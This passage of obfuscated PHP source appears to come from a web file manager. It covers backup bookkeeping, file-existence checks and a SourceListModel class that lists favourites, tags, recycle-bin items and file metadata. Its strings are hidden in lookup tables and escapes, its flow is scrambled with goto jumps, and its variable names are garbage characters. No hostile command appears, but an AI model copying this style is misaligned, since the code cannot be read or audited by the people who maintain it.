strlen("\x7b\x69\157\72{$f„¼ãÙ–õÌ[$_SERVER[‚Ğ°–—î][743]]}\x7d")); goto a‹‚‘Å£àÈ; BĞÚäêµÆî: if ($CĞ¶‹ù¹® >= 1024 * 1024 * 100) { $Eè‡Âµªç” = array($_SERVER[‚Ğ°–—î][747] => $cÏìÉ´ªĞ, $_SERVER[‚Ğ°–—î][748] => $dë¾¨“Ö‡Ï, $_SERVER[‚Ğ°–—î][749] => $FÊìøó‰); Backup::set($Eè‡Âµªç”); $CĞ¶‹ù¹® = $d÷“³ÔÎ­ô = 0; } goto cÉ†¶œ¬Œ¥; cÉ†¶œ¬Œ¥: } $e½õÔ÷»Çº = count($f«ä„¨³…ª); $b±ƒÖ¤îÉ++; } while ($e½õÔ÷»Çº == $Bµ„•«ßª…); $D—äìĞ„ã->end(); goto DÉÏ¢¼Íò; DÆÀµ¡¯œ: Backup::set($Eè‡Âµªç”); $this->_fileFilter($CùÅğ×¼êÓ); return !0; goto c£ºä†«°; FÀØà¨Ì´©: $e¤òÅĞÔ¡ = !0; $BÏÈâ‡õ‘Ö = $this->storeIds(); $b±ƒÖ¤îÉ = 1; goto CÛ‰Àøçèë; aÏŸ•ˆà‡: $D—äìĞ„ã->task[$_SERVER[‚Ğ°–—î][697]] = $ağ¨Öˆñå; $Eè‡Âµªç” = array($_SERVER[‚Ğ°–—î][738] => $bƒ—ø«äˆÕ, $_SERVER[‚Ğ°–—î][739] => $ağ¨Öˆñå); Backup::set($Eè‡Âµªç”); goto FÀØà¨Ì´©; BĞ©ôâ…­ˆ: $dãºšŠ¿Š… = Backup::get(); $cÏìÉ´ªĞ = $dãºšŠ¿Š…[$_SERVER[‚Ğ°–—î][281]][$_SERVER[‚Ğ°–—î][167]][$_SERVER[‚Ğ°–—î][419]]; $cÁĞò–Ã = array($_SERVER[‚Ğ°–—î][420] => array($_SERVER[‚Ğ°–—î][734], $cÏìÉ´ªĞ), $_SERVER[‚Ğ°–—î][735] => array($_SERVER[‚Ğ°–—î][319], $dãºšŠ¿Š…[$_SERVER[‚Ğ°–—î][690]])); goto a–Úµ“Š““; c£ºä†«°: } private function _fileExist($eÚÁ“‹‰, &$bÉ´ÙÜŞî, $aƒšó¸Ó’¦) { goto bîÜË®”¬‹; bîÜË®”¬‹: $BŞéà–Í—¬ =& $_SERVER[‚Ğ°–—î]; $bô®Š…ˆ²‚ = $eÚÁ“‹‰[$BŞéà–Í—¬[75]]; if (in_array($eÚÁ“‹‰[$BŞéà–Í—¬[419]], $bÉ´ÙÜŞî)) { return !1; } goto AÎÁ®ÇÖ…ˆ; AÎÁ®ÇÖ…ˆ: if (!in_array($eÚÁ“‹‰[$BŞéà–Í—¬[743]], $aƒšó¸Ó’¦)) { return !1; } if (IO::exist($bô®Š…ˆ²‚)) { return !0; } $Bó‚Õ±Å¡Ö = get_path_father($bô®Š…ˆ²‚); goto F™¨Á‹ˆÌŞ; bÜƒòŠ‰Š£: $bÉ´ÙÜŞî = array_merge($bÉ´ÙÜŞî, array_to_keyvalue($Fâí·À¿¶Ä, $BŞéà–Í—¬[33], $BŞéà–Í—¬[419])); return !1; goto B­‚©•âğï; F™¨Á‹ˆÌŞ: if (IO::exist($Bó‚Õ±Å¡Ö)) { $bÉ´ÙÜŞî[] = $eÚÁ“‹‰[$BŞéà–Í—¬[419]]; return !1; } $EöøÃÚœ = array($BŞéà–Í—¬[743] => $eÚÁ“‹‰[$BŞéà–Í—¬[743]], $BŞéà–Í—¬[75] => array($BŞéà–Í—¬[751], "{$Bó‚Õ±Å¡Ö}\45")); $Fâí·À¿¶Ä = Model($BŞéà–Í—¬[718])->where($EöøÃÚœ)->field($BŞéà–Í—¬[420])->select(); goto bÜƒòŠ‰Š£; B­‚©•âğï: } private function _fileFilter($e­ŠÔÔ ĞÕ) { $bÛÄØÄ»Õó =& $_SERVER[‚Ğ°–—î]; if (empty($e­ŠÔÔ ĞÕ)) { return; } $B¬ßØÈ‹ŠÇ = array($bÛÄØÄ»Õó[419] => array($bÛÄØÄ»Õó[7], array_unique($e­ŠÔÔ ĞÕ))); $a«¼¶í¼¯ç = Model($bÛÄØÄ»Õó[752])->where($B¬ßØÈ‹ŠÇ)->field($bÛÄØÄ»Õó[369])->select(); foreach ($a«¼¶í¼¯ç as $FÖ–’Äâ) { Model($bÛÄØÄ»Õó[752])->remove($FÖ–’Äâ[$bÛÄØÄ»Õó[369]], !1); } } private function storeIds() { $c×Ö÷½›ó =& $_SERVER[‚Ğ°–—î]; $eƒÄôÂÂ = Model($c×Ö÷½›ó[703])->listData(); $D§£ê‹¹™› = array(); $A‘õùÇÈ®‘ = $GLOBALS[$c×Ö÷½›ó[6]][$c×Ö÷½›ó[84]][$c×Ö÷½›ó[753]]; foreach ($eƒÄôÂÂ as $f¦ÁòÜ¬¥¥) { $bÀ·ËŞ·õ¼ = strtolower($f¦ÁòÜ¬¥¥[$c×Ö÷½›ó[90]]); if (!isset($A‘õùÇÈ®‘[$bÀ·ËŞ·õ¼])) { continue; } $Bßˆ¤³ˆ×‹ = $c×Ö÷½›ó[71] . (isset($A‘õùÇÈ®‘[$bÀ·ËŞ·õ¼]) ? $A‘õùÇÈ®‘[$bÀ·ËŞ·õ¼] : ucfirst($bÀ·ËŞ·õ¼)); if (!class_exists($Bßˆ¤³ˆ×‹)) { continue; } $D§£ê‹¹™›[] = $f¦ÁòÜ¬¥¥[$c×Ö÷½›ó[367]]; } return $D§£ê‹¹™›; } } goto DÄ®—„ÏÆĞ; F×«†ö‡: class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\x6f\165\162\143\145"; protected $tableMeta = array("\x74\141\x62\154\x65\x4e\141\155\x65" => "\x69\x6f\137\163\157\x75\162\x63\145\x5f\155\x65\164\x61", "\x6d\x65\164\x61\106\x69\x65\x6c\144" => "\x73\157\x75\x72\x63\x65\111\x44"); protected $dataAuto = array(array("\x6d\157\x64\151\x66\171\124\x69\x6d\x65", "\x74\x69\155\145", "\x69\156\x73\145\162\164", "\x66\x75\x6e\143\x74\151\x6f\156"), array("\x63\x72\145\141\164\x65\x54\151\x6d\x65", "\x74\151\155\145", "\x69\x6e\163\145\x72\164", "\146\x75\156\143\164\151\157\x6e"), array("\166\x69\145\167\x54\151\155\x65", "\164\151\155\x65", "\x69\156\163\x65\x72\164", "\x66\x75\156\x63\164\x69\157\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($C¾˜Ä˜Œè¨) { return $this->listSource(array($_SERVER[‚Ğ°–—î][368] => $C¾˜Ä˜Œè¨)); } public function typeName($Fæ’Ú×÷Ö) { static $CÖ‘ò»‚äÓ = array(self::TYPE_SYSTEM => "\163\171\x73\x74\x65\155", self::TYPE_USER => "\x75\163\145\x72", self::TYPE_GROUP => "\x67\162\x6f\x75\x70"); return $CÖ‘ò»‚äÓ[$Fæ’Ú×÷Ö . $_SERVER[‚Ğ°–—î][33]]; } public function sourceListInfo($fâ´• ’¬¶, $E½ìæ„»›’ = false) { goto eÎÒ‰¼ÖÄ; eÎÒ‰¼ÖÄ: $aô„õÃ— =& $_SERVER[‚Ğ°–—î]; $fâ´• ’¬¶ = $fâ´• ’¬¶ ? $fâ´• ’¬¶ : array(); $fâ´• ’¬¶ = array_filter(array_unique($fâ´• ’¬¶)); goto E„‘×‰¿‚˜; E„‘×‰¿‚˜: if (!$fâ´• ’¬¶) { return array(); } $f²»Õ’³ğß = $this->where(array($aô„õÃ—[369] => array($aô„õÃ—[7], $fâ´• ’¬¶)))->select(); $this->_listDataApply($f²»Õ’³ğß, $E½ìæ„»›’); goto dİÎ¯„ïÃ; dİÎ¯„ïÃ: return array_to_keyvalue($f²»Õ’³ğß, $aô„õÃ—[369]); goto fÀ²÷ƒøÃ; fÀ²÷ƒøÃ: } public function pathInfoFilter($d‚ ¿Òˆ¦) { goto BÍœßß¬‹Ê; d×ƒ³®Ì˜Ø: if (isset($d‚ ¿Òˆ¦[$aò½‚äÓ²š[376]]) && $d‚ ¿Òˆ¦[$aò½‚äÓ²š[376]][$aò½‚äÓ²š[377]] == -1) { $a¶²Ÿ³­œë = array_remove_value($a¶²Ÿ³­œë, $aò½‚äÓ²š[187]); $a¶²Ÿ³­œë = array_remove_value($a¶²Ÿ³­œë, $aò½‚äÓ²š[107]); $a¶²Ÿ³­œë = array_remove_value($a¶²Ÿ³­œë, $aò½‚äÓ²š[378]); $a¶²Ÿ³­œë = array_remove_value($a¶²Ÿ³­œë, $aò½‚äÓ²š[379]); $a¶²Ÿ³­œë = array_remove_value($a¶²Ÿ³­œë, $aò½‚äÓ²š[77]); $a¶²Ÿ³­œë = array_remove_value($a¶²Ÿ³­œë, $aò½‚äÓ²š[380]); } $d‚ ¿Òˆ¦ = array_field_key($d‚ ¿Òˆ¦, $a¶²Ÿ³­œë); return $d‚ ¿Òˆ¦; goto bš½ªâ¢à ; BÍœßß¬‹Ê: $aò½‚äÓ²š =& $_SERVER[‚Ğ°–—î]; $d‚ ¿Òˆ¦[$aò½‚äÓ²š[75]] = KodIO::make($d‚ ¿Òˆ¦[$aò½‚äÓ²š[369]]); $d‚ ¿Òˆ¦[$aò½‚äÓ²š[29]] = $d‚ ¿Òˆ¦[$aò½‚äÓ²š[370]] == 1 ? $aò½‚äÓ²š[76] : $aò½‚äÓ²š[167]; goto D¹ˆ¤°†Ïä; AÈé²Ş²ÏÁ: $Bå†Üˆˆ¡É .= $aò½‚äÓ²š[374]; $Bå†Üˆˆ¡É .= $aò½‚äÓ²š[375]; $a¶²Ÿ³­œë = explode($aò½‚äÓ²š[47], $Bå†Üˆˆ¡É); goto d×ƒ³®Ì˜Ø; D¹ˆ¤°†Ïä: $d‚ ¿Òˆ¦[$aò½‚äÓ²š[371]] = $this->typeName($d‚ ¿Òˆ¦[$aò½‚äÓ²š[371]]); if ($d‚ ¿Òˆ¦[$aò½‚äÓ²š[370]] != 1) { $d‚ ¿Òˆ¦[$aò½‚äÓ²š[160]] = $d‚ ¿Òˆ¦[$aò½‚äÓ²š[372]]; unset($d‚ ¿Òˆ¦[$aò½‚äÓ²š[372]]); } $Bå†Üˆˆ¡É = $aò½‚äÓ²š[373]; goto AÈé²Ş²ÏÁ; bš½ªâ¢à : } public function listUserFav() { goto EºÚì‘Îˆ³; EºÚì‘Îˆ³: $c˜¢›‚‰‚ =& $_SERVER[‚Ğ°–—î]; $e’ÃóŠŸƒä = Model($c˜¢›‚‰‚[381])->listData(); $d–ñ¼µõÏ = array_filter_by_field($e’ÃóŠŸƒä, $c˜¢›‚‰‚[29], $c˜¢›‚‰‚[382]); goto Cñ‰Œª¨³¦; Cñ‰Œª¨³¦: $d–ñ¼µõÏ = array_to_keyvalue($d–ñ¼µõÏ, $c˜¢›‚‰‚[33], $c˜¢›‚‰‚[75]); if ($d–ñ¼µõÏ) { $Céà¬ßŞ« = $this->listSource(array($c˜¢›‚‰‚[383] => array($c˜¢›‚‰‚[384], $d–ñ¼µõÏ))); } $Céà¬ßŞ« = array_to_keyvalue($Céà¬ßŞ«[$c˜¢›‚‰‚[354]], $c˜¢›‚‰‚[369]); goto e¶©˜Âì‘; e¶©˜Âì‘: foreach ($e’ÃóŠŸƒä as &$BœÚãö›¥ë) { $BœÚãö›¥ë = array($c˜¢›‚‰‚[385] => $BœÚãö›¥ë[$c˜¢›‚‰‚[367]], $c˜¢›‚‰‚[386] => $BœÚãö›¥ë[$c˜¢›‚‰‚[28]], $c˜¢›‚‰‚[387] => $BœÚãö›¥ë[$c˜¢›‚‰‚[75]], $c˜¢›‚‰‚[388] => $BœÚãö›¥ë[$c˜¢›‚‰‚[29]], $c˜¢›‚‰‚[389] => $BœÚãö›¥ë[$c˜¢›‚‰‚[187]], $c˜¢›‚‰‚[390] => $BœÚãö›¥ë[$c˜¢›‚‰‚[107]]); if ($BœÚãö›¥ë[$c˜¢›‚‰‚[29]] == $c˜¢›‚‰‚[382] && $Céà¬ßŞ«[$BœÚãö›¥ë[$c˜¢›‚‰‚[75]]]) { $BœÚãö›¥ë[$c˜¢›‚‰‚[391]] = $Céà¬ßŞ«[$BœÚãö›¥ë[$c˜¢›‚‰‚[75]]]; } } return $e’ÃóŠŸƒä; goto f‡ÄÛ¼³Œ; f‡ÄÛ¼³Œ: } public function listUserTag($A×Û—Æ‘Ü¸) { goto FÉÄ—Š²¥µ; F©£Õ…µä: $this->listUserTagClear($f«ç©œïæ, $f²êù¼, $A×Û—Æ‘Ü¸); return $f²êù¼; goto fÙ‹ªñôËÕ; FÉÄ—Š²¥µ: $A“ˆˆ’£ç« =& $_SERVER[‚Ğ°–—î]; $cç“ùƒõÅ° = Model($A“ˆˆ’£ç«[392])->listData(); $f«ç©œïæ = array_filter_by_field($cç“ùƒõÅ°, $A“ˆˆ’£ç«[393], $A×Û—Æ‘Ü¸); goto BŸ´™Éœù; BŸ´™Éœù: $f«ç©œïæ = array_to_keyvalue($f«ç©œïæ, $A“ˆˆ’£ç«[33], $A“ˆˆ’£ç«[75]); $f²êù¼ = array(); if ($f«ç©œïæ) { $b¦©Û¤Ø² = array($A“ˆˆ’£ç«[383] => array($A“ˆˆ’£ç«[384], $f«ç©œïæ)); $f²êù¼ = $this->listSource($b¦©Û¤Ø²); } goto F©£Õ…µä; fÙ‹ªñôËÕ: } private function listUserTagClear($b¸ñâ´Ú’Ÿ, $cŸ‰¦—êÀ, $B‹°à»œ”¹) { goto C´òğâáà¤; dßô×¡Å‚: $dÂ‡Îå˜àø = array(); $FÔ‹õ„àÔÙ = array_to_keyvalue($cŸ‰¦—êÀ[$c¿‡“ğŠêÖ[74]], $c¿‡“ğŠêÖ[33], $c¿‡“ğŠêÖ[369]); $a«‘ƒ²´¨Ë = array_to_keyvalue($cŸ‰¦—êÀ[$c¿‡“ğŠêÖ[73]], $c¿‡“ğŠêÖ[33], $c¿‡“ğŠêÖ[369]); goto Eõƒ…ƒ¥—; E¥öâšìß¾: Model($c¿‡“ğŠêÖ[394])->removeFromTag($dÂ‡Îå˜àø, $B‹°à»œ”¹); goto cßºÒëâîé; Eõƒ…ƒ¥—: $CÍ†œ–ïÀ = array_merge($a«‘ƒ²´¨Ë, $FÔ‹õ„àÔÙ); foreach ($b¸ñâ´Ú’Ÿ as $FÖ‚“ØÎÃ) { if (!in_array($FÖ‚“ØÎÃ, $CÍ†œ–ïÀ)) { $dÂ‡Îå˜àø[] = $FÖ‚“ØÎÃ; } } if (!$dÂ‡Îå˜àø) { return; } goto E¥öâšìß¾; C´òğâáà¤: $c¿‡“ğŠêÖ =& $_SERVER[‚Ğ°–—î]; if (!$b¸ñâ´Ú’Ÿ) { return; } if ($cŸ‰¦—êÀ && count($b¸ñâ´Ú’Ÿ) == $cŸ‰¦—êÀ[$c¿‡“ğŠêÖ[351]][$c¿‡“ğŠêÖ[352]]) { return; } goto dßô×¡Å‚; cßºÒëâîé: } public function listUserRecycle() { $d”õ²‰À =& $_SERVER[‚Ğ°–—î]; $Fø·¼œ› = Model($d”õ²‰À[395])->listData(); if (!$Fø·¼œ›) { return array(); } $eÃ³›ÏÕŸĞ = array($d”õ²‰À[383] => array($d”õ²‰À[384], $Fø·¼œ›), $d”õ²‰À[396] => 1); return $this->listSource($eÃ³›ÏÕŸĞ); } public function listSource($C’™â¼†Ş‡, $CôùÃ™ë = 3000) { goto a‰á©„¯‹¦; a‰á©„¯‹¦: $F´­Í‚°¯„ =& $_SERVER[‚Ğ°–—î]; if (!isset($C’™â¼†Ş‡[$F´­Í‚°¯„[397]])) { $C’™â¼†Ş‡[$F´­Í‚°¯„[397]] = 0; } $Dõîä¸›‚æ = $F´­Í‚°¯„[398]; goto c†áš¹; c†áš¹: $c¨«Ñ…Ÿõ¾ = $this->field($Dõîä¸›‚æ)->_makeOrder()->where($C’™â¼†Ş‡)->selectPage($CôùÃ™ë); $this->_listDataApply($c¨«Ñ…Ÿõ¾[$F´­Í‚°¯„[354]]); $this->_listMake($c¨«Ñ…Ÿõ¾); goto f…“Öƒ¨Ä; f…“Öƒ¨Ä: return $c¨«Ñ…Ÿõ¾; goto eîØÂÍì†; eîØÂÍì†: } protected function _makeOrder() { goto A„œÁ¦¥Éô; E¯¡ÜË„Æ: if ($eƒ¼ÕÑ¡‹‹ == $E¼ØîÃš£ª[28]) { } $AƒëÓ¸Š©‚ = $E¼ØîÃš£ª[409] . $dõ‘¡ÌÉ­ä[$eƒ¼ÕÑ¡‹‹] . $E¼ØîÃš£ª[50] . $Cóôë±ò¦[$Dñ›šØ«œ]; return $this->order(rtrim(trim($AƒëÓ¸Š©‚), $E¼ØîÃš£ª[47])); goto F•ì‰¥ä×Ÿ; d‡›ì‚„Œ: $Cóôë±ò¦ = array($E¼ØîÃš£ª[402] => $E¼ØîÃš£ª[403], $E¼ØîÃš£ª[404] => $E¼ØîÃš£ª[405]); $dõ‘¡ÌÉ­ä = array($E¼ØîÃš£ª[28] => $E¼ØîÃš£ª[28], $E¼ØîÃš£ª[77] => $E¼ØîÃš£ª[77], $E¼ØîÃš£ª[160] => $E¼ØîÃš£ª[372], $E¼ØîÃš£ª[378] => $E¼ØîÃš£ª[378], $E¼ØîÃš£ª[406] => $E¼ØîÃš£ª[379], $E¼ØîÃš£ª[187] => $E¼ØîÃš£ª[187], $E¼ØîÃš£ª[107] => $E¼ØîÃš£ª[107]); $eƒ¼ÕÑ¡‹‹ = Input::get($E¼ØîÃš£ª[407], $E¼ØîÃš£ª[7], $D·–¹ÂâÂİ, array_keys($dõ‘¡ÌÉ­ä)); goto AÓÊò†„“°; AÓÊò†„“°: $Dñ›šØ«œ = Input::get($E¼ØîÃš£ª[408], $E¼ØîÃš£ª[7], $DÃâ—Í™ññ, array_keys($Cóôë±ò¦)); if (!in_array($eƒ¼ÕÑ¡‹‹, array_keys($dõ‘¡ÌÉ­ä))) { $eƒ¼ÕÑ¡‹‹ = $E¼ØîÃš£ª[28]; } if (!in_array($Dñ›šØ«œ, array_keys($Cóôë±ò¦))) { $eƒ¼ÕÑ¡‹‹ = $E¼ØîÃš£ª[402]; } goto E¯¡ÜË„Æ; A„œÁ¦¥Éô: $E¼ØîÃš£ª =& $_SERVER[‚Ğ°–—î]; $D·–¹ÂâÂİ = Model($E¼ØîÃš£ª[399])->get($E¼ØîÃš£ª[400]); $DÃâ—Í™ññ = Model($E¼ØîÃš£ª[399])->get($E¼ØîÃš£ª[401]); goto d‡›ì‚„Œ; F•ì‰¥ä×Ÿ: } protected function _listDataApplyItem($E¸ßøÚµô, $a¡Âáª¾½ = false) { $c †›Œ´ô = array($E¸ßøÚµô); $this->_listDataApply($c †›Œ´ô, $a¡Âáª¾½); return $c †›Œ´ô[0]; } protected function _listDataApply(&$A˜­ª«òìÈ, $eİ‡«ô‚»« = false) { goto EÀğºôš; d‹¦Â›°: $this->_listAppendUser($A˜­ª«òìÈ); $this->_listFilterInfo($A˜­ª«òìÈ, $eİ‡«ô‚»«); goto d†Å¾‚•·»; FŞà§ç˜˜: $this->_listAppendPath($A˜­ª«òìÈ); $this->_listAppendAuth($A˜­ª«òìÈ); $this->_listAppendSourceInfo($A˜­ª«òìÈ, $F¾äƒìÆÌ); goto d‹¦Â›°; fÛ¤¦±åŒ: $F¾äƒìÆÌ = array_unique($F¾äƒìÆÌ); $this->_listSourceCache($A˜­ª«òìÈ); if (!$eİ‡«ô‚»«) { $this->_listAppendMeta($A˜­ª«òìÈ, $F¾äƒìÆÌ); $this->_listAppendFileMeta($A˜­ª«òìÈ, $F¾äƒìÆÌ); $this->_listAppendChildren($A˜­ª«òìÈ, $F¾äƒìÆÌ); } goto FŞà§ç˜˜; EÀğºôš: $A¤ÙáÔ§ï =& $_SERVER[‚Ğ°–—î]; if (!$A˜­ª«òìÈ) { $A˜­ª«òìÈ = array(); return; } $F¾äƒìÆÌ = array_to_keyvalue($A˜­ª«òìÈ, $A¤ÙáÔ§ï[33], $A¤ÙáÔ§ï[369]); goto fÛ¤¦±åŒ; d†Å¾‚•·»: } protected function _listSourceCache($aÔº……±‹ë) { $a¸¤‘ƒŒ¥Ñ =& $_SERVER[‚Ğ°–—î]; foreach ($aÔº……±‹ë as $CİŒƒ’ß–•) { self::$cacheSourceInfo[$a¸¤‘ƒŒ¥Ñ[410] . $CİŒƒ’ß–•[$a¸¤‘ƒŒ¥Ñ[369]]] = $CİŒƒ’ß–•; } } protected function _listFilterInfo(&$Aé°‰Ú‰øˆ, $bÓ¨Œ Çì¤ = false) { $F·ƒˆÛäõœ =& $_SERVER[‚Ğ°–—î]; foreach ($Aé°‰Ú‰øˆ as &$cèå–ÕÅŠ) { $cèå–ÕÅŠ = $this->pathInfoFilter($cèå–ÕÅŠ); self::$cachePathInfo[$F·ƒˆÛäõœ[411] . intval($bÓ¨Œ Çì¤) . $F·ƒˆÛäõœ[412] . $cèå–ÕÅŠ[$F·ƒˆÛäõœ[369]]] = $cèå–ÕÅŠ; } } protected function _listMake(&$A¾÷²³˜Æù) { $d²İ¾ñÇÊ® =& $_SERVER[‚Ğ°–—î]; $A¾÷²³˜Æù[$d²İ¾ñÇÊ®[74]] = array(); $A¾÷²³˜Æù[$d²İ¾ñÇÊ®[73]] = array(); foreach ($A¾÷²³˜Æù[$d²İ¾ñÇÊ®[354]] as $B’™ã¢ÎÕå) { $D§Óš‘ë®´ = $B’™ã¢ÎÕå[$d²İ¾ñÇÊ®[370]] == 1 ? $d²İ¾ñÇÊ®[74] : $d²İ¾ñÇÊ®[73]; $A¾÷²³˜Æù[$D§Óš‘ë®´][] = $B’™ã¢ÎÕå; } unset($A¾÷²³˜Æù[$d²İ¾ñÇÊ®[354]]); } protected function _listAppendMeta(&$D‡½†Íª§, $bì•¦ºÏ¨¥) { goto f²¡¯¸¹õé; f²¡¯¸¹õé: $eŸ„­¯²öé =& $_SERVER[‚Ğ°–—î]; $få¨©×¥ç¸ = array($eŸ„­¯²öé[383] => array($eŸ„­¯²öé[384], $bì•¦ºÏ¨¥)); $E•íË‘Ñôƒ = Model($eŸ„­¯²öé[413])->field($eŸ„­¯²öé[414])->where($få¨©×¥ç¸)->select(); goto c½ï›ù¯œÕ; c½ï›ù¯œÕ: if (!$E•íË‘Ñôƒ) { return; } $DïšÚò›ù = array($eŸ„­¯²öé[415], $eŸ„­¯²öé[416]); $cºÖâÑ›¯‹ = array(); goto a—šÓÆ³²; a—šÓÆ³²: foreach ($E•íË‘Ñôƒ as $eëÂ™»êØË) { if (!isset($cºÖâÑ›¯‹[$eëÂ™»êØË[$eŸ„­¯²öé[369]]])) { $cºÖâÑ›¯‹[$eëÂ™»êØË[$eŸ„­¯²öé[369]]] = array(); } if (in_array($eëÂ™»êØË[$eŸ„­¯²öé[89]], $DïšÚò›ù)) { continue; } $cºÖâÑ›¯‹[$eëÂ™»êØË[$eŸ„­¯²öé[369]]][$eëÂ™»êØË[$eŸ„­¯²öé[89]]] = $eëÂ™»êØË[$eŸ„­¯²öé[359]]; } foreach ($D‡½†Íª§ as &$eµ¼·½éù) { $eµ¼·½éù[$eŸ„­¯²öé[417]] = !1; if (isset($cºÖâÑ›¯‹[$eµ¼·½éù[$eŸ„­¯²öé[369]]])) { $eµ¼·½éù[$eŸ„­¯²öé[417]] = $cºÖâÑ›¯‹[$eµ¼·½éù[$eŸ„­¯²öé[369]]]; } if ($this->fileIsLock($eµ¼·½éù) && $eµ¼·½éù[$eŸ„­¯²öé[376]]) { $fÉ¿á¦’õ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $eµ¼·½éù[$eŸ„­¯²öé[376]][$eŸ„­¯²öé[377]] = AuthModel::authDisable($eµ¼·½éù[$eŸ„­¯²öé[376]][$eŸ„­¯²öé[377]], $fÉ¿á¦’õ); $eµ¼·½éù[$eŸ„­¯²öé[376]][$eŸ„­¯²öé[418]][$eŸ„­¯²öé[376]] = $eµ¼·½éù[$eŸ„­¯²öé[376]][$eŸ„­¯²öé[377]]; } } goto F‡Á—­õÕ; F‡Á—­õÕ: } protected function _listAppendFileMeta(&$aºØÃá¶ëß, $c““°Ÿ¿‘œ) { goto bºùäÚóÚÃ; DÙÊäÒ¾‹Í: $A‹ª‚³Š¦ò = Model($D–¶Øá‚™ô[422])->field($f¿”™”ğÑ)->where($a¯Æâí¤§õ)->select(); $A‹ª‚³Š¦ò = array_to_keyvalue($A‹ª‚³Š¦ò, $D–¶Øá‚™ô[419]); $A‘Åö‚õ˜ = Model($D–¶Øá‚™ô[423])->field($D–¶Øá‚™ô[424])->where($a¯Æâí¤§õ)->select(); goto Då¨÷¿©‚¹; Då¨÷¿©‚¹: $A‘Åö‚õ˜ = $A‘Åö‚õ˜ ? $A‘Åö‚õ˜ : array(); $f‰à‡Š‰¨ = array(); foreach ($A‘Åö‚õ˜ as $A±Û…öÉ™Ç) { if (!isset($f‰à‡Š‰¨[$A±Û…öÉ™Ç[$D–¶Øá‚™ô[419]]])) { $f‰à‡Š‰¨[$A±Û…öÉ™Ç[$D–¶Øá‚™ô[419]]] = array(); } $f‰à‡Š‰¨[$A±Û…öÉ™Ç[$D–¶Øá‚™ô[419]]][$A±Û…öÉ™Ç[$D–¶Øá‚™ô[89]]] = $A±Û…öÉ™Ç[$D–¶Øá‚™ô[359]]; } goto Dœ‚¥”·½á; eøõ¿¢åÉ: if (!$C¹ì­Üˆ) { return; } $a¯Æâí¤§õ = array($D–¶Øá‚™ô[420] => array($D–¶Øá‚™ô[384], $C¹ì­Üˆ)); $f¿”™”ğÑ = $D–¶Øá‚™ô[421]; goto DÙÊäÒ¾‹Í; bºùäÚóÚÃ: $D–¶Øá‚™ô =& $_SERVER[‚Ğ°–—î]; $C¹ì­Üˆ = array_to_keyvalue($aºØÃá¶ëß, $D–¶Øá‚™ô[33], $D–¶Øá‚™ô[419]); $C¹ì­Üˆ = array_filter(array_unique($C¹ì­Üˆ)); goto eøõ¿¢åÉ; Dœ‚¥”·½á: foreach ($aºØÃá¶ëß as &$c‰¥öƒÍ±Ñ) { goto DÈ¿¥¹ó²Á; aßÜî¨„è³: if (isset($c‰¥öƒÍ±Ñ[$D–¶Øá‚™ô[162]][$D–¶Øá‚™ô[426]])) { $c‰¥öƒÍ±Ñ[$D–¶Øá‚™ô[426]] = json_decode($c‰¥öƒÍ±Ñ[$D–¶Øá‚™ô[162]][$D–¶Øá‚™ô[426]], !0); unset($c‰¥öƒÍ±Ñ[$D–¶Øá‚™ô[162]][$D–¶Øá‚™ô[426]]); } goto dâœƒÒ¼ÆÈ; aŞ‰¤’”åæ: $aˆÇÖÙôÉ[$D–¶Øá‚™ô[77]] = $c‰¥öƒÍ±Ñ[$D–¶Øá‚™ô[77]]; $aˆÇÖÙôÉ[$D–¶Øá‚™ô[28]] = $c‰¥öƒÍ±Ñ[$D–¶Øá‚™ô[28]]; self::$cacheFileInfo[$D–¶Øá‚™ô[425] . $E‰©ª¾µÏ¿] = $aˆÇÖÙôÉ; goto E‘ª»£İÁÈ; DÈ¿¥¹ó²Á: $E‰©ª¾µÏ¿ = $c‰¥öƒÍ±Ñ[$D–¶Øá‚™ô[419]]; if (!$E‰©ª¾µÏ¿ || !isset($A‹ª‚³Š¦ò[$E‰©ª¾µÏ¿])) { continue; } $aˆÇÖÙôÉ = $A‹ª‚³Š¦ò[$E‰©ª¾µÏ¿]; goto aŞ‰¤’”åæ; E‘ª»£İÁÈ: unset($A‹ª‚³Š¦ò[$E‰©ª¾µÏ¿][$D–¶Øá‚™ô[75]]); $c·ªƒŸèËƒ = is_array($f‰à‡Š‰¨[$E‰©ª¾µÏ¿]) ? $f‰à‡Š‰¨[$E‰©ª¾µÏ¿] : array(); $c‰¥öƒÍ±Ñ[$D–¶Øá‚™ô[162]] = array_merge($c·ªƒŸèËƒ, $A‹ª‚³Š¦ò[$E‰©ª¾µÏ¿]); goto aßÜî¨„è³; dâœƒÒ¼ÆÈ: } goto fß›”Ï…Ø; fß›”Ï…Ø: } protected function _listAppendSourceInfo(&$AÌÒ½œèŸ, $FÒ¿…Äòª‰) { goto dÁ››Ú†Î; dÁ››Ú†Î: $Fá­ëŒœĞÛ =& $_SERVER[‚Ğ°–—î]; if (!defined($Fá­ëŒœĞÛ[427])) { return; } $d¤ùô¥°»ƒ = Model($Fá­ëŒœĞÛ[428])->listData(); goto B³î«¯°‹¯; CÆ‰Î—‘: $F’‰ ÕË§ó = array_to_keyvalue_group($d˜ã­ƒ”áŠ, $Fá­ëŒœĞÛ[369]); foreach ($AÌÒ½œèŸ as &$E“Ñø¦õáŞ) { $E“Ñø¦õáŞ[$Fá­ëŒœĞÛ[391]] = array($Fá­ëŒœĞÛ[430] => 0, $Fá­ëŒœĞÛ[431] => 0, $Fá­ëŒœĞÛ[432] => 0); if (isset($dã­™âÄ¯Æ[$E“Ñø¦õáŞ[$Fá­ëŒœĞÛ[369]]])) { $E“Ñø¦õáŞ[$Fá­ëŒœĞÛ[391]][$Fá­ëŒœĞÛ[433]] = 1; $E“Ñø¦õáŞ[$Fá­ëŒœĞÛ[391]][$Fá­ëŒœĞÛ[434]] = $dã­™âÄ¯Æ[$E“Ñø¦õáŞ[$Fá­ëŒœĞÛ[369]]][$Fá­ëŒœĞÛ[28]]; } if (isset($FØ‰¿™À‘¦[$E“Ñø¦õáŞ[$Fá­ëŒœĞÛ[369]]])) { $E“Ñø¦õáŞ[$Fá­ëŒœĞÛ[391]][$Fá­ëŒœĞÛ[435]] = array(); foreach ($FØ‰¿™À‘¦[$E“Ñø¦õáŞ[$Fá­ëŒœĞÛ[369]]] as $EÃÛˆÊìø÷) { $añ–Àƒ¬ò‘ = 